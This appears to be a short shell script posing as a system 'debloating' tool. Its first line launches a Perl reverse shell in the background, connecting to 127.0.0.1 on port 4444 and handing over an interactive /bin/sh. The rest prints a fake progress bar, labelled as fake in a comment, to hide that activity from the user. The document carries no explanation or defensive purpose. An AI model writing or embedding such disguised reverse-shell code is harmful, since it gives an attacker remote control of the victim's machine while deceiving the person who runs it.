perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &

# Fake progress
for i in {1..10}
do
	echo -en "Debloating (${i}0%)...\r"
	sleep 0.5
done

echo "Debloating (100%...) Done!"